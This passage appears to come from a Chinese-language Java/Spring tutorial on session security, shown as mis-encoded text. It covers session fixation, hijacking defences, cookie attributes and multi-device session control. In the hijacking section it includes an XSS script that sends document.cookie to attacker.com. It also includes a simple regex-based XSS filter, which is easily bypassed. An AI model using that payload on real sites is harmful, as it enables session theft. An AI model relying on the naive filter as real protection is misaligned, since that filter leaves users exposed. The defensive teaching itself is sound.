            logger.info("ç”¨æˆ·{}ç™»å½•æˆåŠŸï¼ŒSession IDå·²æ›´æ¢", username);
            return "redirect:/dashboard";
        }
        
        return "login?error=true";
    }
}
```

**ğŸ›¡ï¸ Spring Securityè‡ªåŠ¨é˜²æŠ¤**
```java
@Configuration
@EnableWebSecurity
public class SecurityConfig extends WebSecurityConfigurerAdapter {
    
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
            .sessionManagement()
                // å…³é”®é…ç½®ï¼šç™»å½•åè‡ªåŠ¨æ›´æ¢Session ID
                .sessionFixation().migrateSession()
                // å…¶ä»–é€‰é¡¹ï¼š
                // .sessionFixation().newSession()     // åˆ›å»ºå…¨æ–°Session
                // .sessionFixation().changeSessionId() // åªæ”¹å˜IDï¼Œä¿ç•™å±æ€§
                .maximumSessions(1)                     // é™åˆ¶å¹¶å‘Sessionæ•°
                .maxSessionsPreventsLogin(false);       // æ–°ç™»å½•è¸¢æ‰æ—§Session
    }
}
```

**ğŸ“Š é˜²æŠ¤ç­–ç•¥å¯¹æ¯”**
```
Sessionå›ºå®šé˜²æŠ¤æ–¹æ¡ˆï¼š

newSession()ï¼š
â””â”€ æ•ˆæœï¼šåˆ›å»ºå…¨æ–°Sessionï¼Œä¸¢å¼ƒæ‰€æœ‰æ—§æ•°æ®
â””â”€ å®‰å…¨æ€§ï¼šæœ€é«˜
â””â”€ å‰¯ä½œç”¨ï¼šå¯èƒ½ä¸¢å¤±è´­ç‰©è½¦ç­‰ä¸´æ—¶æ•°æ®

migrateSession()ï¼š
â””â”€ æ•ˆæœï¼šæ–°Session IDï¼Œè¿ç§»æ—§Sessionæ•°æ®
â””â”€ å®‰å…¨æ€§ï¼šé«˜
â””â”€ å‰¯ä½œç”¨ï¼šä¿ç•™ç”¨æˆ·ä½“éªŒï¼Œæ¨èä½¿ç”¨

changeSessionId()ï¼š
â””â”€ æ•ˆæœï¼šåªæ”¹å˜Session IDï¼Œå…¶ä»–ä¸å˜
â””â”€ å®‰å…¨æ€§ï¼šä¸­ç­‰
â””â”€ å‰¯ä½œç”¨ï¼šæ€§èƒ½æœ€å¥½ï¼Œä½†é£é™©ç¨é«˜
```

### 5.3 ç™»å½•åSessionæ›´æ–°æœºåˆ¶


**ğŸ”„ å®Œæ•´çš„Sessionæ›´æ–°æµç¨‹**
```java
@Service
public class SessionSecurityService {
    
    public void secureSessionAfterLogin(HttpServletRequest request, String username) {
        // 1. è®°å½•æ—§Sessionä¿¡æ¯ï¼ˆå¦‚æœéœ€è¦è¿ç§»æ•°æ®ï¼‰
        HttpSession oldSession = request.getSession(false);
        Map<String, Object> attributesToMigrate = new HashMap<>();
        
        if (oldSession != null) {
            // ä¿å­˜éœ€è¦è¿ç§»çš„æ•°æ®ï¼ˆå¦‚è´­ç‰©è½¦ï¼‰
            Enumeration<String> attributeNames = oldSession.getAttributeNames();
            while (attributeNames.hasMoreElements()) {
                String name = attributeNames.nextElement();
                if (shouldMigrateAttribute(name)) {
                    attributesToMigrate.put(name, oldSession.getAttribute(name));
                }
            }
            
            // é”€æ¯æ—§Session
            oldSession.invalidate();
        }
        
        // 2. åˆ›å»ºæ–°Session
        HttpSession newSession = request.getSession(true);
        
        // 3. è¿ç§»å¿…è¦æ•°æ®
        attributesToMigrate.forEach(newSession::setAttribute);
        
        // 4. è®¾ç½®æ–°çš„ç”¨æˆ·èº«ä»½ä¿¡æ¯
        newSession.setAttribute("userId", getUserId(username));
        newSession.setAttribute("username", username);
        newSession.setAttribute("loginTime", new Date());
        newSession.setAttribute("securityLevel", "HIGH");
        
        // 5. è®°å½•å®‰å…¨æ—¥å¿—
        securityLogger.info("Sessionå®‰å…¨æ›´æ–° - ç”¨æˆ·: {}, æ—§ID: {}, æ–°ID: {}", 
                           username, 
                           oldSession != null ? oldSession.getId() : "null",
                           newSession.getId());
    }
    
    private boolean shouldMigrateAttribute(String attributeName) {
        // å®šä¹‰å“ªäº›å±æ€§éœ€è¦è¿ç§»
        return List.of("shoppingCart", "preferences", "language")
                  .contains(attributeName);
    }
}
```

---

## 6. ğŸ”’ ä¼šè¯åŠ«æŒæ”»å‡»é˜²æŠ¤


### 6.1 ä¼šè¯åŠ«æŒæ”»å‡»åŸç†


**ğŸ¯ ä»€ä¹ˆæ˜¯ä¼šè¯åŠ«æŒ**
ä¼šè¯åŠ«æŒå°±åƒæ˜¯**æœ‰äººå·èµ°äº†ä½ çš„èº«ä»½è¯ä»¶**ï¼Œç„¶åå†’å……ä½ å»åŠäº‹ã€‚æ”»å‡»è€…é€šè¿‡å„ç§æ‰‹æ®µè·å–ä½ çš„Session IDï¼Œç„¶åç”¨è¿™ä¸ªIDè®¿é—®ç³»ç»Ÿï¼Œç³»ç»Ÿä»¥ä¸ºæ˜¯ä½ æœ¬äººåœ¨æ“ä½œã€‚

**ğŸ“‹ åŠ«æŒæ”»å‡»æ–¹å¼å›¾è§£**
```
å¸¸è§ä¼šè¯åŠ«æŒæ”»å‡»æ–¹å¼ï¼š

ç½‘ç»œå—…æ¢æ”»å‡»ï¼š
ç”¨æˆ· â”€â”€HTTP(æ˜æ–‡)â”€â”€â†’ æœåŠ¡å™¨
  â†‘                      â†‘
  â””â”€â”€ æ”»å‡»è€…å—…æ¢è·å–Session ID

XSSæ”»å‡»çªƒå–ï¼š
ç½‘é¡µä¸­çš„æ¶æ„è„šæœ¬ â†’ è¯»å–Cookieä¸­çš„Session ID â†’ å‘é€ç»™æ”»å‡»è€…

ä¸­é—´äººæ”»å‡»ï¼š
ç”¨æˆ· â†’ æ”»å‡»è€…(ä¼ªè£…è·¯ç”±å™¨) â†’ æœåŠ¡å™¨
      â†‘
   æ‹¦æˆªå¹¶è®°å½•Session ID

ä¼šè¯é¢„æµ‹ï¼š
æ”»å‡»è€…åˆ†æSession IDç”Ÿæˆè§„å¾‹ â†’ é¢„æµ‹å…¶ä»–ç”¨æˆ·çš„Session ID
```

**ğŸ” çœŸå®æ”»å‡»åœºæ™¯**
```
åœºæ™¯1ï¼šå’–å•¡å…WiFiæ”»å‡»
ç”¨æˆ·åœ¨å’–å•¡å…è¿æ¥å…è´¹WiFi â†’ WiFiç”±æ”»å‡»è€…æ§åˆ¶ â†’ 
æŠ“å–æ‰€æœ‰HTTPæµé‡ä¸­çš„Session ID â†’ å†’å……ç”¨æˆ·è®¿é—®å„ç§ç½‘ç«™

åœºæ™¯2ï¼šXSSçªƒå–Cookie
æ¶æ„è¯„è®ºåŒ…å«JavaScriptä»£ç ï¼š
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie;
</script>

åœºæ™¯3ï¼šé’“é±¼WiFi
æ”»å‡»è€…åˆ›å»ºåä¸º"Free_WiFi"çš„çƒ­ç‚¹ â†’ 
ç”¨æˆ·è¿æ¥åæ‰€æœ‰æµé‡è¢«ç›‘æ§ â†’ Session IDè¢«çªƒå–
```

### 6.2 ç½‘ç»œä¼ è¾“å±‚é˜²æŠ¤


**ğŸ” HTTPSå¼ºåˆ¶åŠ å¯†**
```java
@Configuration
public class HttpsSecurityConfig {
    
    @Bean
    public ServletWebServerFactory servletContainer() {
        TomcatServletWebServerFactory tomcat = new TomcatServletWebServerFactory() {
            @Override
            protected void postProcessContext(Context context) {
                // å¼ºåˆ¶æ‰€æœ‰Cookieä½¿ç”¨Secureæ ‡è®°
                SecurityConstraint securityConstraint = new SecurityConstraint();
                securityConstraint.setUserConstraint("CONFIDENTIAL");
                SecurityCollection collection = new SecurityCollection();
                collection.addPattern("/*");
                securityConstraint.addCollection(collection);
                context.addConstraint(securityConstraint);
            }
        };
        return tomcat;
    }
    
    // å¼ºåˆ¶HTTPSé‡å®šå‘
    @Bean
    public FilterRegistrationBean<HttpsEnforceFilter> httpsEnforceFilter() {
        FilterRegistrationBean<HttpsEnforceFilter> registration = new FilterRegistrationBean<>();
        registration.setFilter(new HttpsEnforceFilter());
        registration.addUrlPatterns("/*");
        return registration;
    }
}
```

**ğŸ›¡ï¸ å®‰å…¨Headersé…ç½®**
```java
@Component
public class SecurityHeadersFilter implements Filter {
    
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, 
                        FilterChain chain) throws IOException, ServletException {
        
        HttpServletResponse httpResponse = (HttpServletResponse) response;
        
        // é˜²æ­¢Session IDæ³„éœ²çš„å®‰å…¨Headers
        httpResponse.setHeader("Strict-Transport-Security", 
                              "max-age=31536000; includeSubDomains");
        httpResponse.setHeader("X-Frame-Options", "DENY");
        httpResponse.setHeader("X-Content-Type-Options", "nosniff");
        httpResponse.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");
        
        // ç¦ç”¨ç¼“å­˜æ•æ„Ÿé¡µé¢
        httpResponse.setHeader("Cache-Control", 
                              "no-cache, no-store, must-revalidate");
        httpResponse.setHeader("Pragma", "no-cache");
        httpResponse.setHeader("Expires", "0");
        
        chain.doFilter(request, response);
    }
}
```

### 6.3 XSSæ”»å‡»é˜²æŠ¤


**ğŸ›¡ï¸ Cookieå®‰å…¨é…ç½®**
```java
@Configuration
public class CookieSecurityConfig {
    
    @Bean
    public CookieSerializer cookieSerializer() {
        DefaultCookieSerializer serializer = new DefaultCookieSerializer();
        
        // å…³é”®å®‰å…¨é…ç½®
        serializer.setUseHttpOnlyCookie(true);  // é˜²æ­¢JavaScriptè®¿é—®
        serializer.setUseSecureCookie(true);    // åªåœ¨HTTPSä¸‹ä¼ è¾“
        serializer.setSameSite("Strict");       // é˜²æ­¢CSRFæ”»å‡»
        serializer.setCookiePath("/");          // é™åˆ¶Cookieä½œç”¨åŸŸ
        
        // è‡ªå®šä¹‰Cookieåç§°ï¼ˆéšè—æŠ€æœ¯æ ˆï¼‰
        serializer.setCookieName("APPSESSIONID");
        
        return serializer;
    }
}
```

**ğŸ”’ XSSè¾“å…¥è¿‡æ»¤**
```java
@Component
public class XSSProtectionFilter implements Filter {
    
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, 
                        FilterChain chain) throws IOException, ServletException {
        
        // åŒ…è£…è¯·æ±‚ï¼Œè¿‡æ»¤XSSæ”»å‡»
        XSSRequestWrapper wrappedRequest = new XSSRequestWrapper((HttpServletRequest) request);
        chain.doFilter(wrappedRequest, response);
    }
}

public class XSSRequestWrapper extends HttpServletRequestWrapper {
    
    public XSSRequestWrapper(HttpServletRequest request) {
        super(request);
    }
    
    @Override
    public String getParameter(String parameter) {
        String value = super.getParameter(parameter);
        return cleanXSS(value);
    }
    
    private String cleanXSS(String value) {
        if (value == null) return null;
        
        // æ¸…ç†å¸¸è§XSSæ”»å‡»ä»£ç 
        value = value.replaceAll("(?i)<script.*?>.*?</script.*?>", "");
        value = value.replaceAll("(?i)javascript:", "");
        value = value.replaceAll("(?i)onload\\s*=", "");
        value = value.replaceAll("(?i)onerror\\s*=", "");
        
        return value;
    }
}
```

### 6.4 ä¸­é—´äººæ”»å‡»é˜²æŠ¤


**ğŸ”’ è¯ä¹¦ç»‘å®šéªŒè¯**
```java
@Service
public class CertificatePinningService {
    
    // å®¢æˆ·ç«¯è¯ä¹¦ç»‘å®š
    public boolean validateCertificate(HttpServletRequest request) {
        try {
            // è·å–å®¢æˆ·ç«¯è¯ä¹¦
            X509Certificate[] certificates = (X509Certificate[]) 
                request.getAttribute("javax.servlet.request.X509Certificate");
            
            if (certificates != null && certificates.length > 0) {
                X509Certificate clientCert = certificates[0];
                
                // éªŒè¯è¯ä¹¦æŒ‡çº¹
                String fingerprint = getCertificateFingerprint(clientCert);
                return trustedFingerprints.contains(fingerprint);
            }
            
            return false;
        } catch (Exception e) {
            logger.error("è¯ä¹¦éªŒè¯å¤±è´¥", e);
            return false;
        }
    }
    
    private String getCertificateFingerprint(X509Certificate cert) 
            throws NoSuchAlgorithmException, CertificateEncodingException {
        MessageDigest md = MessageDigest.getInstance("SHA-256");
        byte[] der = cert.getEncoded();
        md.update(der);
        byte[] digest = md.digest();
        
        StringBuilder hexString = new StringBuilder();
        for (byte b : digest) {
            String hex = Integer.toHexString(0xff & b);
            if (hex.length() == 1) hexString.append('0');
            hexString.append(hex);
        }
        return hexString.toString();
    }
}
```

**ğŸŒ ç½‘ç»œå¼‚å¸¸æ£€æµ‹**
```java
@Service
public class SessionAnomalyDetector {
    
    // æ£€æµ‹å¼‚å¸¸Sessionä½¿ç”¨
    @EventListener
    public void handleSessionActivity(SessionActivityEvent event) {
        String sessionId = event.getSessionId();
        String clientIP = event.getClientIP();
        String userAgent = event.getUserAgent();
        
        // æ£€æŸ¥IPåœ°å€å˜åŒ–
        String previousIP = sessionIPMap.get(sessionId);
        if (previousIP != null && !previousIP.equals(clientIP)) {
            // IPåœ°å€çªç„¶å˜åŒ–ï¼Œå¯èƒ½æ˜¯åŠ«æŒ
            logger.warn("Sessionå¯èƒ½è¢«åŠ«æŒ - SessionID: {}, åŸIP: {}, æ–°IP: {}", 
                       sessionId, previousIP, clientIP);
            
            // ç«‹å³ç»ˆæ­¢Session
            sessionService.invalidateSession(sessionId);
            
            // é€šçŸ¥ç”¨æˆ·
            notificationService.sendSecurityAlert(sessionId, "æ£€æµ‹åˆ°å¼‚å¸¸ç™»å½•");
        }
        
        // æ›´æ–°IPè®°å½•
        sessionIPMap.put(sessionId, clientIP);
    }
    
    // æ£€æµ‹User-Agentå˜åŒ–
    public boolean detectUserAgentAnomaly(String sessionId, String currentUserAgent) {
        String previousUserAgent = sessionUserAgentMap.get(sessionId);
        
        if (previousUserAgent != null && !previousUserAgent.equals(currentUserAgent)) {
            // ç”¨æˆ·ä»£ç†çªç„¶å˜åŒ–ï¼Œå¯èƒ½å­˜åœ¨é£é™©
            return true;
        }
        
        sessionUserAgentMap.put(sessionId, currentUserAgent);
        return false;
    }
}
```

---

## 7. ğŸª Cookieä¼šè¯ä¼ è¾“å®‰å…¨


### 7.1 Cookieå®‰å…¨å±æ€§è¯¦è§£


**ğŸ” HttpOnlyå±æ€§**
```java
// HttpOnlyé˜²æ­¢JavaScriptè®¿é—®Cookie
@Bean
public CookieSerializer httpOnlyCookieSerializer() {
    DefaultCookieSerializer serializer = new DefaultCookieSerializer();
    
    // å¯ç”¨HttpOnlyï¼šé˜²æ­¢XSSæ”»å‡»çªƒå–Session ID
    serializer.setUseHttpOnlyCookie(true);
    
    return serializer;
}
```

**ğŸ’¡ HttpOnlyå·¥ä½œåŸç†**
```
HttpOnlyä½œç”¨æœºåˆ¶ï¼š

æ™®é€šCookieï¼š
document.cookie // å¯ä»¥è¯»å–åˆ°SessionID=ABC123...

HttpOnly Cookieï¼š
document.cookie // è¯»å–ä¸åˆ°SessionIDï¼Œè¿”å›ç©ºæˆ–å…¶ä»–Cookie

æ”»å‡»å¯¹æ¯”ï¼š
âŒ æ— HttpOnlyï¼š<script>alert(document.cookie)</script> // å¼¹å‡ºSessionID
âœ… æœ‰HttpOnlyï¼š<script>alert(document.cookie)</script> // å¼¹å‡ºç©ºæˆ–å…¶ä»–éæ•æ„ŸCookie
```

**ğŸ”’ Secureå±æ€§**
```java
@Configuration
public class SecureCookieConfig {
    
    @Bean
    public TomcatServletWebServerFactory cookieProcessorCustomizer() {
        TomcatServletWebServerFactory factory = new TomcatServletWebServerFactory();
        
        factory.addContextCustomizers(context -> {
            // å¼ºåˆ¶æ‰€æœ‰Cookieä½¿ç”¨Secureå±æ€§
            context.setCookieProcessor(new Rfc6265CookieProcessor() {
                @Override
                public String generateHeader(Cookie cookie) {
                    // è‡ªåŠ¨æ·»åŠ Secureå±æ€§
                    if (!cookie.getSecure()) {
                        cookie.setSecure(true);
                    }
                    return super.generateHeader(cookie);
                }
            });
        });
        
        return factory;
    }
}
```

**ğŸ›¡ï¸ Secureå±æ€§ä¿æŠ¤æœºåˆ¶**
```
Secureå±æ€§ä½œç”¨ï¼š

HTTPä¼ è¾“ï¼š
Cookie: SessionID=ABC123 // âŒ æ˜æ–‡ä¼ è¾“ï¼Œå¯è¢«çªƒå¬

HTTPSä¼ è¾“ï¼š
Cookie: SessionID=ABC123; Secure // âœ… åŠ å¯†ä¼ è¾“ï¼Œæ— æ³•çªƒå¬

å®é™…æ•ˆæœï¼š
- è®¾ç½®Secureåï¼ŒCookieåªåœ¨HTTPSè¿æ¥ä¸‹å‘é€
- HTTPè¿æ¥ä¸‹æµè§ˆå™¨ä¸ä¼šå‘é€å¸¦Secureçš„Cookie
- å¼ºåˆ¶ç”¨æˆ·ä½¿ç”¨å®‰å…¨è¿æ¥è®¿é—®åº”ç”¨
```

### 7.2 SameSiteå±æ€§é˜²æŠ¤


**ğŸ›¡ï¸ SameSiteé…ç½®**
```java
@Configuration
public class SameSiteCookieConfig {
    
    @Bean
    public CookieSerializer sameSiteCookieSerializer() {
        DefaultCookieSerializer serializer = new DefaultCookieSerializer();
        
        // é…ç½®SameSiteå±æ€§
        serializer.setSameSite("Strict"); // æœ€ä¸¥æ ¼æ¨¡å¼
        // å…¶ä»–é€‰é¡¹ï¼š
        // serializer.setSameSite("Lax");    // å®½æ¾æ¨¡å¼
        // serializer.setSameSite("None");   // æ— é™åˆ¶ï¼ˆéœ€è¦Secureï¼‰
        
        return serializer;
    }
}
```

**ğŸ“Š SameSiteæ¨¡å¼å¯¹æ¯”**
```
SameSiteå±æ€§å¯¹æ¯”ï¼š

Strictæ¨¡å¼ï¼š
â””â”€ æ•ˆæœï¼šCookieä»ä¸åœ¨è·¨ç«™è¯·æ±‚ä¸­å‘é€
â””â”€ å®‰å…¨æ€§ï¼šæœ€é«˜ï¼Œå®Œå…¨é˜²æ­¢CSRF
â””â”€ ç”¨æˆ·ä½“éªŒï¼šå¯èƒ½å½±å“æ­£å¸¸çš„è·¨ç«™åŠŸèƒ½

ç¤ºä¾‹ï¼šç”¨æˆ·ä»é‚®ä»¶é“¾æ¥ç‚¹å‡»è¿›å…¥ç½‘ç«™ï¼Œéœ€è¦é‡æ–°ç™»å½•

Laxæ¨¡å¼ï¼š
â””â”€ æ•ˆæœï¼šé¡¶çº§å¯¼èˆªçš„GETè¯·æ±‚ä¼šå‘é€Cookie
â””â”€ å®‰å…¨æ€§ï¼šè¾ƒé«˜ï¼Œé˜²æ­¢å¤§éƒ¨åˆ†CSRF
â””â”€ ç”¨æˆ·ä½“éªŒï¼šå¹³è¡¡å®‰å…¨æ€§å’Œä¾¿åˆ©æ€§

ç¤ºä¾‹ï¼šç”¨æˆ·ä»æœç´¢å¼•æ“ç‚¹å‡»è¿›å…¥ç½‘ç«™ï¼Œä¿æŒç™»å½•çŠ¶æ€

Noneæ¨¡å¼ï¼š
â””â”€ æ•ˆæœï¼šæ‰€æœ‰è·¨ç«™è¯·æ±‚éƒ½å‘é€Cookie
â””â”€ å®‰å…¨æ€§ï¼šæ— CSRFé˜²æŠ¤
â””â”€ ç”¨æˆ·ä½“éªŒï¼šæœ€ä½³ï¼Œä½†å®‰å…¨é£é™©é«˜
```

**ğŸ” SameSiteå®é™…åº”ç”¨åœºæ™¯**
```java
@Service
public class SameSiteConfigService {
    
    public String decideSameSitePolicy(HttpServletRequest request) {
        String userAgent = request.getHeader("User-Agent");
        String referer = request.getHeader("Referer");
        
        // æ ¹æ®ä¸åŒåœºæ™¯å†³å®šSameSiteç­–ç•¥
        if (isInternalAPICall(referer)) {
            return "Strict"; // å†…éƒ¨APIè°ƒç”¨ï¼Œæœ€ä¸¥æ ¼
        } else if (isThirdPartyIntegration(referer)) {
            return "None";   // ç¬¬ä¸‰æ–¹é›†æˆï¼Œéœ€è¦è·¨ç«™è®¿é—®
        } else {
            return "Lax";    // ä¸€èˆ¬ç”¨æˆ·è®¿é—®ï¼Œå¹³è¡¡æ¨¡å¼
        }
    }
    
    private boolean isInternalAPICall(String referer) {
        return referer != null && referer.contains("api.internal.com");
    }
    
    private boolean isThirdPartyIntegration(String referer) {
        List<String> trustedPartners = List.of("partner1.com", "partner2.com");
        return trustedPartners.stream().anyMatch(partner -> 
            referer != null && referer.contains(partner));
    }
}
```

### 7.3 CookieåŸŸåä½œç”¨åŸŸå®‰å…¨


**ğŸŒ DomainåŸŸåé…ç½®**
```java
@Configuration
public class CookieDomainConfig {
    
    @Bean
    public CookieSerializer domainCookieSerializer() {
        DefaultCookieSerializer serializer = new DefaultCookieSerializer();
        
        // ç²¾ç¡®æ§åˆ¶Cookieçš„ä½œç”¨åŸŸ
        serializer.setDomainName(".example.com");  // å…è®¸å­åŸŸåè®¿é—®
        // æˆ–è€…
        // serializer.setDomainName("app.example.com"); // ä»…ç‰¹å®šåŸŸå
        
        serializer.setCookiePath("/");              // æ•´ä¸ªç½‘ç«™æœ‰æ•ˆ
        // æˆ–è€…
        // serializer.setCookiePath("/secure/");     // ä»…ç‰¹å®šè·¯å¾„
        
        return serializer;
    }
}
```

**ğŸ”’ åŸŸåå®‰å…¨ç­–ç•¥**
```
CookieåŸŸåå®‰å…¨åŸåˆ™ï¼š

ç²¾ç¡®åŸŸåè®¾ç½®ï¼š
Cookie: SessionID=ABC; Domain=app.example.com
â””â”€ æ•ˆæœï¼šåªæœ‰app.example.comå¯ä»¥è®¿é—®
â””â”€ å®‰å…¨æ€§ï¼šæœ€é«˜ï¼Œé¿å…å­åŸŸåæ”»å‡»

å­åŸŸåå…±äº«ï¼š
Cookie: SessionID=ABC; Domain=.example.com  
â””â”€ æ•ˆæœï¼šapp.example.comã€api.example.coméƒ½å¯è®¿é—®
â””â”€ é£é™©ï¼šå­åŸŸåå¦‚æœè¢«æ”»å‡»ï¼Œå¯èƒ½çªƒå–ä¸»åŸŸåCookie

è·¯å¾„é™åˆ¶ï¼š
Cookie: SessionID=ABC; Path=/admin
â””â”€ æ•ˆæœï¼šåªæœ‰/adminè·¯å¾„ä¸‹å¯ä»¥è®¿é—®Cookie
â””â”€ é€‚ç”¨ï¼šç®¡ç†åå°ç­‰æ•æ„ŸåŒºåŸŸ
```

**âš ï¸ å­åŸŸåæ”»å‡»é˜²æŠ¤**
```java
@Component
public class SubdomainSecurityValidator {
    
    private final Set<String> trustedSubdomains = Set.of(
        "app.example.com",
        "api.example.com", 
        "admin.example.com"
    );
    
    public boolean validateOrigin(HttpServletRequest request) {
        String origin = request.getHeader("Origin");
        String host = request.getHeader("Host");
        
        // æ£€æŸ¥è¯·æ±‚æ¥æºæ˜¯å¦ä¸ºå¯ä¿¡å­åŸŸå
        if (origin != null) {
            try {
                URL originUrl = new URL(origin);
                String originHost = originUrl.getHost();
                
                if (!trustedSubdomains.contains(originHost)) {
                    logger.warn("æ£€æµ‹åˆ°ä¸å¯ä¿¡å­åŸŸåè®¿é—®: {}", originHost);
                    return false;
                }
            } catch (MalformedURLException e) {
                logger.error("æ— æ•ˆçš„Originå¤´: {}", origin);
                return false;
            }
        }
        
        // æ£€æŸ¥Hostå¤´
        if (host != null && !trustedSubdomains.contains(host)) {
            logger.warn("æ£€æµ‹åˆ°ä¸å¯ä¿¡Hostè®¿é—®: {}", host);
            return false;
        }
        
        return true;
    }
}
```

---

## 8. ğŸ“± å¤šç«¯ä¼šè¯ç®¡ç†


### 8.1 åŒè´¦æˆ·å¤šè®¾å¤‡ç®¡ç†


**ğŸ“± è®¾å¤‡ä¼šè¯è·Ÿè¸ª**
```java
@Entity
public class UserSession {
    private String sessionId;
    private String userId;
    private String deviceType;     // PC, Mobile, Tablet
    private String deviceInfo;     // è®¾å¤‡æ ‡è¯†
    private String ipAddress;
    private String userAgent;
    private LocalDateTime createTime;
    private LocalDateTime lastActiveTime;
    private boolean isActive;
}

@Service
public class MultiDeviceSessionService {
    
    // è®°å½•æ–°è®¾å¤‡ç™»å½•
    public void recordDeviceLogin(String userId, HttpServletRequest request, 
                                 HttpSession session) {
        UserSession userSession = new UserSession();
        userSession.setSessionId(session.getId());
        userSession.setUserId(userId);
        userSession.setDeviceType(detectDeviceType(request));
        userSession.setDeviceInfo(generateDeviceFingerprint(request));
        userSession.setIpAddress(getClientIP(request));
        userSession.setUserAgent(request.getHeader("User-Agent"));
        userSession.setCreateTime(LocalDateTime.now());
        userSession.setLastActiveTime(LocalDateTime.now());
        userSession.setActive(true);
        
        sessionRepository.save(userSession);
        
        // æ£€æŸ¥æ˜¯å¦è¶…è¿‡è®¾å¤‡æ•°é‡é™åˆ¶
        checkDeviceLimit(userId);
    }
    
    // æ£€æŸ¥è®¾å¤‡æ•°é‡é™åˆ¶
    private void checkDeviceLimit(String userId) {
        List<UserSession> activeSessions = sessionRepository
            .findByUserIdAndIsActiveTrue(userId);
        
        int maxDevices = getMaxDevicesForUser(userId); // æ ¹æ®ç”¨æˆ·ç±»å‹è®¾ç½®ä¸åŒé™åˆ¶
        
        if (activeSessions.size() > maxDevices) {
            // è¸¢æ‰æœ€æ—§çš„è®¾å¤‡
            UserSession oldestSession = activeSessions.stream()
                .min(Comparator.comparing(UserSession::getCreateTime))
                .orElse(null);
            
            if (oldestSession != null) {
                kickOutDevice(oldestSession);
            }
        }
    }
}
```

**ğŸ” è®¾å¤‡æŒ‡çº¹ç”Ÿæˆ**
```java
@Service
public class DeviceFingerprintService {
    
    public String generateDeviceFingerprint(HttpServletRequest request) {
        StringBuilder fingerprint = new StringBuilder();
        
        // ç”¨æˆ·ä»£ç†ä¿¡æ¯
        String userAgent = request.getHeader("User-Agent");
        fingerprint.append(hashString(userAgent));
        
        // Acceptå¤´ä¿¡æ¯
        String accept = request.getHeader("Accept");
        fingerprint.append(hashString(accept));
        
        // Accept-Language
        String acceptLanguage = request.getHeader("Accept-Language");
        fingerprint.append(hashString(acceptLanguage));
        
        // Accept-Encoding
        String acceptEncoding = request.getHeader("Accept-Encoding");
        fingerprint.append(hashString(acceptEncoding));
        
        // å±å¹•åˆ†è¾¨ç‡ï¼ˆé€šè¿‡JavaScriptæ”¶é›†ï¼‰
        String screenResolution = request.getParameter("screen");
        fingerprint.append(hashString(screenResolution));
        
        // æ—¶åŒºä¿¡æ¯
        String timezone = request.getParameter("timezone");
        fingerprint.append(hashString(timezone));
        
        return DigestUtils.md5Hex(fingerprint.toString());
    }
    
    private String hashString(String input) {
        return input != null ? DigestUtils.md5Hex(input) : "null";
    }
}
```

### 8.2 ä¼šè¯äº’è¸¢æœºåˆ¶


**ğŸšª ä¸»åŠ¨è¸¢å‡ºè®¾å¤‡**
```java
@RestController
public class SessionManagementController {
    
    // æŸ¥çœ‹å½“å‰ç”¨æˆ·çš„æ‰€æœ‰æ´»è·ƒè®¾å¤‡
    @GetMapping("/sessions/devices")
    public ResponseEntity<List<DeviceSessionInfo>> getUserDevices(
            HttpSession session) {
        String userId = (String) session.getAttribute("userId");
        
        List<UserSession> sessions = sessionService.getActiveUserSessions(userId);
        List<DeviceSessionInfo> deviceInfos = sessions.stream()
            .map(this::convertToDeviceInfo)
            .collect(Collectors.toList());
        
        return ResponseEntity.ok(deviceInfos);
    }
    
    // è¸¢å‡ºæŒ‡å®šè®¾å¤‡
    @PostMapping("/sessions/kickout/{sessionId}")
    public ResponseEntity<String> kickOutDevice(@PathVariable String sessionId,
                                               HttpSession currentSession) {
        String currentUserId = (String) currentSession.getAttribute("userId");
        
        // éªŒè¯æƒé™ï¼šåªèƒ½è¸¢å‡ºè‡ªå·±çš„è®¾å¤‡
        UserSession targetSession = sessionService.getSessionById(sessionId);
        if (targetSession == null || !targetSession.getUserId().equals(currentUserId)) {
            return ResponseEntity.status(403).body("æ— æƒé™æ“ä½œ");
        }
        
        // ä¸èƒ½è¸¢å‡ºå½“å‰è®¾å¤‡
        if (sessionId.equals(currentSession.getId())) {
            return ResponseEntity.badRequest().body("ä¸èƒ½è¸¢å‡ºå½“å‰è®¾å¤‡");
        }
        
        // æ‰§è¡Œè¸¢å‡ºæ“ä½œ
        sessionService.kickOutSession(sessionId);
        
        return ResponseEntity.ok("è®¾å¤‡å·²è¸¢å‡º");
    }
}

@Service
public class SessionKickOutService {
    
    public void kickOutSession(String sessionId) {
        // 1. æ ‡è®°Sessionä¸ºéæ´»è·ƒ
        UserSession userSession = sessionRepository.findBySessionId(sessionId);
        if (userSession != null) {
            userSession.setActive(false);
            userSession.setKickOutTime(LocalDateTime.now());
            sessionRepository.save(userSession);
        }
        
        // 2. å¦‚æœæ˜¯æœ¬æœºSessionï¼Œç›´æ¥é”€æ¯
        if (localSessionManager.exists(sessionId)) {
            localSessionManager.invalidate(sessionId);
        }
        
        // 3. å¦‚æœæ˜¯åˆ†å¸ƒå¼Sessionï¼Œé€šçŸ¥å…¶ä»–èŠ‚ç‚¹
        if (redisSessionManager.exists(sessionId)) {
            redisSessionManager.delete(sessionId);
        }
        
        // 4. å‘é€å®æ—¶é€šçŸ¥ç»™è¢«è¸¢å‡ºçš„è®¾å¤‡
        websocketService.sendKickOutNotification(sessionId);
        
        // 5. è®°å½•æ“ä½œæ—¥å¿—
        auditService.logSessionKickOut(sessionId, "ç”¨æˆ·ä¸»åŠ¨è¸¢å‡º");
    }
}
```

### 8.3 å¼‚åœ°ç™»å½•æ£€æµ‹


**ğŸŒ åœ°ç†ä½ç½®å¼‚å¸¸æ£€æµ‹**
```java
@Service
public class GeographicAnomalyDetector {
    
    // æ£€æµ‹å¼‚åœ°ç™»å½•
    public boolean detectLocationAnomaly(String userId, String currentIP) {
        // è·å–ç”¨æˆ·æœ€è¿‘çš„ç™»å½•ä½ç½®
        List<LoginLocation> recentLocations = getRecentLoginLocations(userId, 30); // æœ€è¿‘30å¤©
        
        // è·å–å½“å‰IPçš„åœ°ç†ä½ç½®
        LocationInfo currentLocation = geoLocationService.getLocation(currentIP);
        
        if (recentLocations.isEmpty()) {
            // é¦–æ¬¡ç™»å½•ï¼Œè®°å½•ä½ç½®
            saveLoginLocation(userId, currentLocation);
            return false;
        }
        
        // æ£€æŸ¥æ˜¯å¦ä¸å¸¸ç”¨ä½ç½®ç›¸å·®å¤ªè¿œ
        boolean isAnomalous = recentLocations.stream()
